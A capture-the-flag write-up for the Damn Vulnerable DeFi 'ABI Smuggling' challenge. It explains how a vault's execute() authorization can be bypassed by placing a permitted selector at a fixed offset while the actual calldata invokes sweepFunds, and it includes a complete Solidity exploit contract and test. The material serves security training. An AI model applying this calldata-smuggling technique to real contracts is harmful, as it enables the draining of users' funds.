# ABI Smuggling

There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.

The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.

The dev team has received a responsible disclosure saying all funds can be stolen.

Rescue all funds from the vault, transferring them to the designated recovery account.

# Challenge overview

[official site](https://damnvulnerabledefi.xyz/challenges/compromised)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The ABI Smuggling is one of the hardes challenge in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the funds from the pool.

> This will be so longer to explain and I may mess while Explaining all the shit by myself. So, in short: The main flaw is in the `execute()` function of `AuthorizedExecutor.sol`. It only checks that the user is calling `withdraw()` using selectors and gives spaces(offser) to 100 bytes and starts storing stuffs after 100 bytes as data and perform activities and there is no check for the data. So, we can add our backdoor inside the data (calling `sweepFunds`) and draining all the funds.

If you want detailed explaination of this lab you can read this [writeup on medium](https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a) by [matta](https://x.com/mattaereal). I can guarantee that you will understand all the stuffs in a single read(If you concentrated to each point).

## POC

okay! Time to POC
```solidity
contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function execute() external returns (bytes memory){
        require(msg.sender == player,"Only player okay");
    

    bytes4 executeSelector = vault.execute.selector;

    bytes memory target = abi.encodePacked(bytes12(0), address(vault));

    bytes memory dataOffset = abi.encodePacked(uint256(0x80));

    bytes memory emptyData = abi.encodePacked(uint256(0));

    // manually defining the withdraw function selector as `d9caed12` followed by zers
    bytes memory WithdrawSelectorPadded = abi.encodePacked(
        bytes4(0xd9caed12),
        bytes28(0)
    );

    // constructing the calldata for the sweepFunds(_)
    bytes memory sweepFundsCalldata = abi.encodeWithSelector(
        vault.sweepFunds.selector,
        recovery,
        token
    );

    uint256 actionCallDataLength = sweepFundsCalldata.length;
    bytes memory actionDataLength = abi.encodePacked(uint256(actionCallDataLength));

    // Combine all parts to create the complete calldata payload
    bytes memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4 bytes
            target,                       // 32 bytes
            dataOffset,                   // 32 bytes
            emptyData,                    // 32 bytes
            WithdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
            actionDataLength,             // Length of actionData
            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
    );

    return calldataPayload;
    }
}
```

You can just call the contract and the function in test function 
```solidity
    function test_abiSmuggling() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(vault),address(token),recovery);

        bytes memory payload = exploit.execute();
        address(vault).call(payload);
    }
```

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**

